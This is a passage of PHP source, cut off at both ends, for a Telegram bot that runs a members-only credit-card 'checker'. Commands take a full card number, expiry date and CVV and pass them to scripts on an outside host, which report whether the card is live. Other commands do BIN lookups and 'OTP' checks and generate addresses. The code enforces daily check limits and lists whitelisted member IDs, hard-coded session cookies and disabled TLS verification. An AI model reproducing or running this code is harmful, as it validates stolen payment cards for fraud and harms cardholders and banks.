    "text" => "*LIVE - *".$firstName."* - *".$usernames."\n✅".$page,
    "parse_mode" => "Markdown"
);

send("sendMessage", $parameters);
}
}

}
#----------------------------------------------------------------# MAIN CHECKER

#----------------------------------------------------------------# ERROR HANDLING

#----------------------------------------------------------------# ERROR HANDLING
#----------------------------------------------------------------# ERROR CODES
#----------------------------------------------------------------# ERROR CODES
    $parameters = array(
        "chat_id" => $userChatId,
        "text" => $page,
        "reply_to_message_id" => $messageId,
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
    }
    
    else{
        $parameters = array(
        "chat_id" => $userChatId,
        "text" => "Sorry, You must put right number before you continue. \nCredit card number: ".$x1."\nMonth: ".$x2."\nYear: ".$x3."\nCvv: ".$x4,
        "reply_to_message_id" => $messageId,
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
    }
    }
}
    else{
$infol = '*You already check* `10` *cards for today.*';
$parameters = array(
        "chat_id" => $userChatId,
        "text" => $infol,
        "reply_to_message_id" => $messageId,
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
    }
    
}  
    else{
    $parameters = array(
        "chat_id" => $userChatId,
        "text" => "*Sorry there are only few members allowed to use this checker.*",
        "reply_to_message_id" => $messageId,
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
    }
}
#---------------------------------------------------------------------------------------------------------------------------------#CC CHARGED CHECK
#---------------------------------------------------------------------------------------------------------------------------------#BIN CHECK
else if ($comand == '!bin'){

#---------------------------------------------------------------------------------------------------------------------------------#BIN CHECK
#----------------------------------------------------------------# MAIN CHECKER
$separadores = array(",","|",":","'"," ","~","»");
$explode = multiexplode($separadores,$ccx);
$ccsx = $explode[0];
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, 'https://www.asianprozibot.xyz/telebotxxx/telebin.php?lista='.$ccsx);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
    'Cookie: ai_user=RpHNN|2020-05-08T06:26:49.508Z; hblid=aS2AwNghT5wtbEKJ3m39N0HcBj4Jk4a6; olfsk=olfsk3452952709293844; _ga=GA1.1.1935804767.1590371618; __atuvc=2%7C22; __qca=P0-1128105619-1590372264299; wcsid=Ze5odwLKCm86dVvs3m39N0HbaFbLo4ka; _okdetect=%7B%22token%22%3A%2215907206601250%22%2C%22proto%22%3A%22http%3A%22%2C%22host%22%3A%22localhost%3A4040%22%7D; _okbk=cd4%3Dtrue%2Cvi5%3D0%2Cvi4%3D1590720660400%2Cvi3%3Dactive%2Cvi2%3Dfalse%2Cvi1%3Dfalse%2Ccd8%3Dchat%2Ccd6%3D0%2Ccd5%3Daway%2Ccd3%3Dfalse%2Ccd2%3D0%2Ccd1%3D0%2C; _ok=1700-237-10-3483; _oklv=1590778611389%2CZe5odwLKCm86dVvs3m39N0HbaFbLo4ka'));
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);


curl_setopt($curl, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($curl, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($curl, CURLOPT_ENCODING , "gzip");
$page = curl_exec($curl);
#----------------------------------------------------------------# MAIN CHECKER
$parameters = array(
        "chat_id" => $userChatId,
        "text" => $page,
        "reply_to_message_id" => $messageId,
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
}
#---------------------------------------------------------------------------------------------------------------------------------#BIN CHECK
#---------------------------------------------------------------------------------------------------------------------------------#OTP CHK

else if ($comand == '@otp'){
$x=array("esp","985989275");
$test = array_search($userChatId,$a);
if($test != null){
   $ss = strlen($ccx);
    if($ss != '28'){
        $parameters = array(
        "chat_id" => $userChatId,
        "text" => "Please remember that I only accept \n`@otp 4xxxxxxxxxxxxxxx|xx|xxxx|(optional)`",
        "reply_to_message_id" => $messageId,
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
}
else{
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, 'https://www.asianprozibot.xyz/telebotxxx/teleotp.php?lista='.$ccx);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
    'Upgrade-Insecure-Requests: 1'));
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($curl, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($curl, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($curl, CURLOPT_ENCODING , "gzip");
$page = curl_exec($curl);
#----------------------------------------------------------------# MAIN CHECKER
$parameters = array(
        "chat_id" => $userChatId,
        "text" => $page,
        "reply_to_message_id" => $messageId,
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
}
}
else{
    $replyMsg = "*Sorry, OTP checker will be only available in trusted members.*";


    $parameters = array(
        "chat_id" => $userChatId,
        "text" => $replyMsg,
        "reply_to_message_id" => $messageId,
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
}
}
#---------------------------------------------------------------------------------------------------------------------------------#OTP CHK
#---------------------------------------------------------------------------------------------------------------------------------#GEN
else if ($userMessages == '@gen'){
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, 'https://www.asianprozibot.xyz/telebotxxx/emailver.php');
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
    'Upgrade-Insecure-Requests: 1'));
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);


curl_setopt($curl, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($curl, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($curl, CURLOPT_ENCODING , "gzip");
$page = curl_exec($curl);
#----------------------------------------------------------------# MAIN CHECKER
$parameters = array(
        "chat_id" => $userChatId,
        "text" => $page,
        "reply_to_message_id" => $messageId,
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
}
#---------------------------------------------------------------------------------------------------------------------------------#GEN
#---------------------------------------------------------------------------------------------------------------------------------#DELETE FUNC
else if ($userMessages == '-delete'){
$parameters = array(
        "chat_id" => $userChatId,
        "message_id" => $del,
    );

    send("deleteMessage", $parameters);
}
else if($dela == '-delete'){
    $parameters = array(
        "chat_id" => $userChatId,
        "message_id" => $messageId,
    );

    send("deleteMessage", $parameters);
}
#---------------------------------------------------------------------------------------------------------------------------------#DELETE FUNC
    else{
    $replyMsg = "*Sorry, I couldn't understand that. :(*";


    $parameters = array(
        "chat_id" => $userChatId,
        "text" => $replyMsg,
        "reply_to_message_id" => $messageId,
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
//            "chat_id" => '-1001405250590',
//            "message_id" => $del,
}
}
}

#---------------------------------------------------------------------------------------------------------------------------------#BIN CHECK
#><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><#PRIVATE

#<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>#SCB CHECKER!binLIST
#<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>#SCB CHECKER!binLIST
#<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>#SCB CHECKER!binLIST
#<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>#SCB CHECKER!binLIST
#<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>#SCB CHECKER!binLIST
#<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>#SCB CHECKER!binLIST
#<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>#SCB CHECKER!binLIST
#<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>#SCB CHECKER!binLIST

###### USERS #######
#ASIANPRO = 985989275
#BLAIRE = 944888214
#ANON = 894982402
#BEGGY = 602325087
#KILLUA = 1223422881
#EONARA = 780001502
#GANKED = 665838060
#malware = 652424054
#HIZE = 1074423732
#sad = 906605094
#SERE = 703645222
#DANGERED = 700368640
#BATO = 803671856
#Drained = 778603041
#BH = 726052416
#DAVE = 675193262
#ewan = 983433654
#PROF = 789717084
#nega = 745975958
#KILLER = 698612166
#POSTOFFICE = 1243839483
#ANONSHI = 684391358
#:( = 675193262
#HANNAH = 450811383
#LLYODI = 778269663
#hanabi = 954265187
#yuno = 1372886324
#shelby = 1052381766
#eros = 1114886739
#Ate vane = 979801896
#Zoldyk = 628734491
#mantou = 764345029
####################

if($superchatId == "-1001405250590"){
if($comand == '@apchk' or $comand == '!bin' or $comand == 'SCB' or $userChatId == '985989275' or $comand == '@gen' or $comand == '@otp' or $comand == '-delete' or $comand == '/logs'){
if($comand == '@apchk'){
$x=array("esp","985989275");
$test = array_search($userChatId,$a);
if($test != null){
  $mi = substr_count(file_get_contents($path), $userChatId);
if($mi < '10'){
$count = '10' - $mi;
$infol = "*You only have* `$count` *checks left for today \n      Please wait . . . . .*";
$parameters = array(
        "chat_id" => $superchatId,
        "text" => $infol,
        "reply_to_message_id" => $messageId,
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
   $ss = strlen($ccx);
    if($ss != '28'){
        $parameters = array(
        "chat_id" => $superchatId,
        "text" => "Please remember that I only accept \n`@apchk 4xxxxxxxxxxxxxxx|xx|xxxx|xxx`",
        "reply_to_message_id" => $messageId,
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
}
else{
$separadores = array(",","|",":","'"," ","~","»");
$explode = multiexplode($separadores,$ccx);
$cc = $explode[0];
$mm = $explode[1];
$yy = $explode[2];
$cvv = $explode[3];

if (is_numeric($cc)){
echo $x1 = 'Valid';
}
else{
echo $x1 = '*Invalid*';
}
if (is_numeric($mm)){
echo $x2 = 'Valid';
}
else{
echo $x2 = '*Invalid*';
}
if (is_numeric($yy)){
echo $x3 = 'Valid';
}
else{
echo $x3 = '*Invalid*';
}
if (is_numeric($cvv)){
echo $x4 = 'Valid';
}
else{
echo $x4 = '*Invalid*';
}

if($x1 == 'Valid'&&$x2 == 'Valid'&&$x3 == 'Valid'&&$x4 == 'Valid'){
    global $ccx;
   #------------------------------------------------------# FOR EXTRAPING

    #------------------------------------------------------# FOR EXTRAPING
    #------------------------------------------------------# FOR CC TYPES

    #------------------------------------------------------# FOR CC TYPES
#----------------------------------------------------------------# BINCODES

#----------------------------------------------------------------# BINCODES
#----------------------------------------------------------------# MAIN CHECKER
    if($mesx%2==0){
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, 'https://asianprozibot.xyz/telebotxxx/telebot.php?lista='.$ccx);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
    'Cookie: ai_user=RpHNN|2020-05-08T06:26:49.508Z; hblid=aS2AwNghT5wtbEKJ3m39N0HcBj4Jk4a6; olfsk=olfsk3452952709293844; _ga=GA1.1.1935804767.1590371618; __atuvc=2%7C22; __qca=P0-1128105619-1590372264299; wcsid=Ze5odwLKCm86dVvs3m39N0HbaFbLo4ka; _okdetect=%7B%22token%22%3A%2215907206601250%22%2C%22proto%22%3A%22http%3A%22%2C%22host%22%3A%22localhost%3A4040%22%7D; _okbk=cd4%3Dtrue%2Cvi5%3D0%2Cvi4%3D1590720660400%2Cvi3%3Dactive%2Cvi2%3Dfalse%2Cvi1%3Dfalse%2Ccd8%3Dchat%2Ccd6%3D0%2Ccd5%3Daway%2Ccd3%3Dfalse%2Ccd2%3D0%2Ccd1%3D0%2C; _ok=1700-237-10-3483; _oklv=1590778611389%2CZe5odwLKCm86dVvs3m39N0HbaFbLo4ka'));
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);


curl_setopt($curl, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($curl, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($curl, CURLOPT_ENCODING , "gzip");
$page = curl_exec($curl);
if($userChatId != $topaul){
fwrite(fopen("infos.txt", "a"), $userChatId."\n");
        }
}
else{
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, 'https://asianprozibot.xyz/telebotxxx/telebot.php?lista='.$ccx);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
    'Cookie: ai_user=RpHNN|2020-05-08T06:26:49.508Z; hblid=aS2AwNghT5wtbEKJ3m39N0HcBj4Jk4a6; olfsk=olfsk3452952709293844; _ga=GA1.1.1935804767.1590371618; __atuvc=2%7C22; __qca=P0-1128105619-1590372264299; wcsid=Ze5odwLKCm86dVvs3m39N0HbaFbLo4ka; _okdetect=%7B%22token%22%3A%2215907206601250%22%2C%22proto%22%3A%22http%3A%22%2C%22host%22%3A%22localhost%3A4040%22%7D; _okbk=cd4%3Dtrue%2Cvi5%3D0%2Cvi4%3D1590720660400%2Cvi3%3Dactive%2Cvi2%3Dfalse%2Cvi1%3Dfalse%2Ccd8%3Dchat%2Ccd6%3D0%2Ccd5%3Daway%2Ccd3%3Dfalse%2Ccd2%3D0%2Ccd1%3D0%2C; _ok=1700-237-10-3483; _oklv=1590778611389%2CZe5odwLKCm86dVvs3m39N0HbaFbLo4ka'));
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);


curl_setopt($curl, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($curl, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($curl, CURLOPT_ENCODING , "gzip");
$page = curl_exec($curl);
if($userChatId != $topaul){
fwrite(fopen("infos.txt", "a"), $userChatId."\n");
        }
}
#----------------------------------------------------------------# MAIN CHECKER

#----------------------------------------------------------------# ERROR HANDLING

#----------------------------------------------------------------# ERROR HANDLING
#----------------------------------------------------------------# ERROR CODES
#----------------------------------------------------------------# ERROR CODES
    $parameters = array(
        "chat_id" => $superchatId,
        "text" => $page,
        "reply_to_message_id" => $messageId,
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
    }
    
    else{
        $parameters = array(
        "chat_id" => $superchatId,
        "text" => "Sorry, You must put right number before you continue. \nCredit card number: ".$x1."\nMonth: ".$x2."\nYear: ".$x3."\nCvv: ".$x4,
        "reply_to_message_id" => $messageId,
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
    }
    }
    }
    else{
$infol = '*You already checked* `10` *cards for today.*';
$parameters = array(
        "chat_id" => $userChatId,
        "text" => $infol,
        "reply_to_message_id" => $messageId,
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
    }
}
    else{
    $parameters = array(
        "chat_id" => $superchatId,
        "text" => "*You are not yet registered in this checker please contact admin.*",
        "reply_to_message_id" => $messageId,
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
    }
}
#---------------------------------------------------------------------------------------------------------------------------------#CC CHECK
else if ($comand == '!bin'){

#---------------------------------------------------------------------------------------------------------------------------------#BIN CHECK
#----------------------------------------------------------------# MAIN CHECKER
$separadores = array(",","|",":","'"," ","~","»");
$explode = multiexplode($separadores,$ccx);
$ccsx = $explode[0];
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, 'https://www.asianprozibot.xyz/telebotxxx/telebin.php?lista='.$ccsx);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
    'Cookie: ai_user=RpHNN|2020-05-08T06:26:49.508Z; hblid=aS2AwNghT5wtbEKJ3m39N0HcBj4Jk4a6; olfsk=olfsk3452952709293844; _ga=GA1.1.1935804767.1590371618; __atuvc=2%7C22; __qca=P0-1128105619-1590372264299; wcsid=Ze5odwLKCm86dVvs3m39N0HbaFbLo4ka; _okdetect=%7B%22token%22%3A%2215907206601250%22%2C%22proto%22%3A%22http%3A%22%2C%22host%22%3A%22localhost%3A4040%22%7D; _okbk=cd4%3Dtrue%2Cvi5%3D0%2Cvi4%3D1590720660400%2Cvi3%3Dactive%2Cvi2%3Dfalse%2Cvi1%3Dfalse%2Ccd8%3Dchat%2Ccd6%3D0%2Ccd5%3Daway%2Ccd3%3Dfalse%2Ccd2%3D0%2Ccd1%3D0%2C; _ok=1700-237-10-3483; _oklv=1590778611389%2CZe5odwLKCm86dVvs3m39N0HbaFbLo4ka'));
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);


curl_setopt($curl, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($curl, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($curl, CURLOPT_ENCODING , "gzip");
$page = curl_exec($curl);
#----------------------------------------------------------------# MAIN CHECKER
$parameters = array(
        "chat_id" => $superchatId,
        "text" => $page,
        "reply_to_message_id" => $messageId,
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
}
#---------------------------------------------------------------------------------------------------------------------------------#BIN CHECK
else if ($comand == '@otp'){
$ad=array("esp","985989275");
// $ad=array("esp","985989275","1243839483","944888214","894982402","602325087","1223422881","780001502","665838060","652424054","1074423732","906605094","703645222","700368640","803671856","778603041","726052416","675193262","794702128","983433654","789717084","745975958","698612166");
$testa = array_search($userChatId,$a);
if($testa != null){
   $ssw = strlen($ccx);
    if($ssw != '28'){
        $parameters = array(
        "chat_id" => '-1001405250590',
        "text" => "Please remember that I only accept \n`@otp 4xxxxxxxxxxxxxxx|xx|xxxx|(optional)`",
        "reply_to_message_id" => $messageId,
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
}
else{
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, 'https://www.asianprozibot.xyz/telebotxxx/teleotp.php?lista='.$ccx);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
    'Upgrade-Insecure-Requests: 1'));
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);


curl_setopt($curl, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($curl, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($curl, CURLOPT_ENCODING , "gzip");
$page = curl_exec($curl);
#----------------------------------------------------------------# MAIN CHECKER
$parameters = array(
        "chat_id" => '-1001405250590',
        "text" => $page,
        "reply_to_message_id" => $messageId,
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
}
}
else{
    $replyMsg = "*Sorry, OTP checker will be only available in trusted members.*";


    $parameters = array(
        "chat_id" => '-1001405250590',
        "text" => $replyMsg,
        "reply_to_message_id" => $messageId,
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
}
}
else if ($comand == '@gen'){
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, 'https://www.asianprozibot.xyz/telebotxxx/emailver.php');
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
    'Upgrade-Insecure-Requests: 1'));
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($curl, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($curl, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($curl, CURLOPT_ENCODING , "gzip");
$page = curl_exec($curl);
#----------------------------------------------------------------# MAIN CHECKER
$parameters = array(
        "chat_id" => '-1001405250590',
        "text" => $page,
        "reply_to_message_id" => $messageId,
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
}
else if ($comand == '-delete'){
    $parameters = array(
        "chat_id" => '-1001405250590',
        "message_id" => $del,
    );

    send("deleteMessage", $parameters);
}
if($dela == '-delete'){
    $parameters = array(
        "chat_id" => '-1001405250590',
        "message_id" => $messageId,
    );

    send("deleteMessage", $parameters);
}
else if($comand == '/logs'){
    $parameters = array(
        "chat_id" => '-1001405250590',
        "text" => "Current version: `v4.0`\nUPDATE: \n- *OTP CHECKER(AVAILABLE FOR EVERYONE)*\n- *BIN CHECKER 100% ONLINE*\n- *ADDRESS GENERATOR PH 100% ONLINE*\n- `-delete` *FUNCTION TO DELETE MESSAGE(JUST REPLY TO MESSAGE YOU WANT TO DELETE.)*\n- *new UPGRADED TO FASTER SERVER*\n Thank you for your support <3",
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
}
else if($comand == 'Please'){
    sleep(10);
    $parameters = array(
        "chat_id" => '-1001405250590',
        "message_id" => $messageId,
    );

    send("deleteMessage", $parameters);
}
}
    else{
    $parameters = array(
        "chat_id" => '-1001405250590',
        "message_id" => $messageId,
    );

    send("deleteMessage", $parameters);
}
}
#<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>#SCB CHECKER!binLIST
#<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>#SCB CHECKER!binLIST
#<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>#SCB CHECKER!binLIST
#<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>#SCB CHECKER!binLIST
#<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>#SCB CHECKER!binLIST
#<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>#SCB CHECKER!binLIST
#<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>#SCB CHECKER!binLIST
#<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>#SCB CHECKER!binLIST






#><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><#PUBLIC

###### USERS #######
#ASIANPRO = 985989275
#BLAIRE = 944888214
#ANON = 894982402
#BEGGY = 602325087
#KILLUA = 1223422881
#EONARA = 780001502
#GANKED = 665838060
#malware = 652424054
#HIZE = 1074423732
#sad = 906605094
#SERE = 703645222
#DANGERED = 700368640
#SUCCIE = 794702128
####################


else if($typeq == "supergroup"){
if($comand == '@apchk'){
$a=array("esp","985989275");
$test = array_search($userChatId,$a);
if($test != null){
   $ss = strlen($ccx);
    if($ss != '28'){
        $parameters = array(
        "chat_id" => $superchatId,
        "text" => "Please remember that I only accept \n`@apchk 4xxxxxxxxxxxxxxx|xx|xxxx|xxx`",
        "reply_to_message_id" => $messageId,
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
}
else{
$separadores = array(",","|",":","'"," ","~","»");
$explode = multiexplode($separadores,$ccx);
$cc = $explode[0];
$mm = $explode[1];
$yy = $explode[2];
$cvv = $explode[3];

if (is_numeric($cc)){
echo $x1 = 'Valid';
}
else{
echo $x1 = '*Invalid*';
}
if (is_numeric($mm)){
echo $x2 = 'Valid';
}
else{
echo $x2 = '*Invalid*';
}
if (is_numeric($yy)){
echo $x3 = 'Valid';
}
else{
echo $x3 = '*Invalid*';
}
if (is_numeric($cvv)){
echo $x4 = 'Valid';
}
else{
echo $x4 = '*Invalid*';
}

if($x1 == 'Valid'&&$x2 == 'Valid'&&$x3 == 'Valid'&&$x4 == 'Valid'){
    global $ccx;
   #------------------------------------------------------# FOR EXTRAPING

    #------------------------------------------------------# FOR EXTRAPING
    #------------------------------------------------------# FOR CC TYPES

    #------------------------------------------------------# FOR CC TYPES
#----------------------------------------------------------------# BINCODES

#----------------------------------------------------------------# BINCODES
#----------------------------------------------------------------# MAIN CHECKER
    if($mesx%2==0){
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, 'https://asianprozibot.xyz/telebotxxx/telebot.php?lista='.$ccx);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
    'Cookie: ai_user=RpHNN|2020-05-08T06:26:49.508Z; hblid=aS2AwNghT5wtbEKJ3m39N0HcBj4Jk4a6; olfsk=olfsk3452952709293844; _ga=GA1.1.1935804767.1590371618; __atuvc=2%7C22; __qca=P0-1128105619-1590372264299; wcsid=Ze5odwLKCm86dVvs3m39N0HbaFbLo4ka; _okdetect=%7B%22token%22%3A%2215907206601250%22%2C%22proto%22%3A%22http%3A%22%2C%22host%22%3A%22localhost%3A4040%22%7D; _okbk=cd4%3Dtrue%2Cvi5%3D0%2Cvi4%3D1590720660400%2Cvi3%3Dactive%2Cvi2%3Dfalse%2Cvi1%3Dfalse%2Ccd8%3Dchat%2Ccd6%3D0%2Ccd5%3Daway%2Ccd3%3Dfalse%2Ccd2%3D0%2Ccd1%3D0%2C; _ok=1700-237-10-3483; _oklv=1590778611389%2CZe5odwLKCm86dVvs3m39N0HbaFbLo4ka'));
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);


curl_setopt($curl, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($curl, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($curl, CURLOPT_ENCODING , "gzip");
$page = curl_exec($curl);
}
else{
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, 'https://asianprozibot.xyz/telebotxxx/telebot.php?lista='.$ccx);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
    'Cookie: ai_user=RpHNN|2020-05-08T06:26:49.508Z; hblid=aS2AwNghT5wtbEKJ3m39N0HcBj4Jk4a6; olfsk=olfsk3452952709293844; _ga=GA1.1.1935804767.1590371618; __atuvc=2%7C22; __qca=P0-1128105619-1590372264299; wcsid=Ze5odwLKCm86dVvs3m39N0HbaFbLo4ka; _okdetect=%7B%22token%22%3A%2215907206601250%22%2C%22proto%22%3A%22http%3A%22%2C%22host%22%3A%22localhost%3A4040%22%7D; _okbk=cd4%3Dtrue%2Cvi5%3D0%2Cvi4%3D1590720660400%2Cvi3%3Dactive%2Cvi2%3Dfalse%2Cvi1%3Dfalse%2Ccd8%3Dchat%2Ccd6%3D0%2Ccd5%3Daway%2Ccd3%3Dfalse%2Ccd2%3D0%2Ccd1%3D0%2C; _ok=1700-237-10-3483; _oklv=1590778611389%2CZe5odwLKCm86dVvs3m39N0HbaFbLo4ka'));
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);


curl_setopt($curl, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($curl, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($curl, CURLOPT_ENCODING , "gzip");
$page = curl_exec($curl);
}
#----------------------------------------------------------------# MAIN CHECKER

#----------------------------------------------------------------# ERROR HANDLING

#----------------------------------------------------------------# ERROR HANDLING
#----------------------------------------------------------------# ERROR CODES
#----------------------------------------------------------------# ERROR CODES
    $parameters = array(
        "chat_id" => $superchatId,
        "text" => $page,
        "reply_to_message_id" => $messageId,
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
    }
    
    else{
        $parameters = array(
        "chat_id" => $superchatId,
        "text" => "Sorry, You must put right number before you continue. \nCredit card number: ".$x1."\nMonth: ".$x2."\nYear: ".$x3."\nCvv: ".$x4,
        "reply_to_message_id" => $messageId,
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
    }
    }
    }
    else{
    $parameters = array(
        "chat_id" => $superchatId,
        "text" => "*Sorry there are only few members allowed to use this checker.*",
        "reply_to_message_id" => $messageId,
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
    }
}
#---------------------------------------------------------------------------------------------------------------------------------#CC CHECK
else if ($comand == '@AsianProZbot'){
    $parameters = array(
        "chat_id" => $superchatId,
        "text" => "*Why?, Darliing!*",
        "reply_to_message_id" => $messageId,
        "parse_mode" => "Markdown"
    );

    send("sendMessage", $parameters);
}
    else if($comand == '@otp'){
$x=array("esp","985989275");
$test = array_search($userChatId,$a);
if($test != null){
   $ss = strlen($ccx);
    if($ss != '28'){
        $parameters = array(
        "chat_id" => $userChatId,
        "text" => "Please remember that I only accept \n`@otp 4xxxxxxxxxxxxxxx|xx|xxxx|(optional)`",
